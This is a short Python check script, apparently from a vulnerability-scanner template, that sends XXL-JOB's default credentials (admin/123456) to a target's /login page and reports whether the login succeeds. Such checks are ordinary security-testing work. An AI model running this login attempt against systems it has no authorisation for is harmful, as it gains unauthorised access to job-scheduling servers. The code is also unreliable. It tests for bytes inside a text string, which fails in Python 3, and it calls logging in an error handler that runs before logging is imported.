#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/login"                                   #填写payload
    header = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }                                                               #填写header头
    data = "userName=admin&password=123456"                                               #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)

        if req.status_code == 200:
            if (b'200' in req.text)  :              #填写判断条件
                logging.info("[+] {} find XXL_JOB_Default_password".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found XXL_JOB_Default_password".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)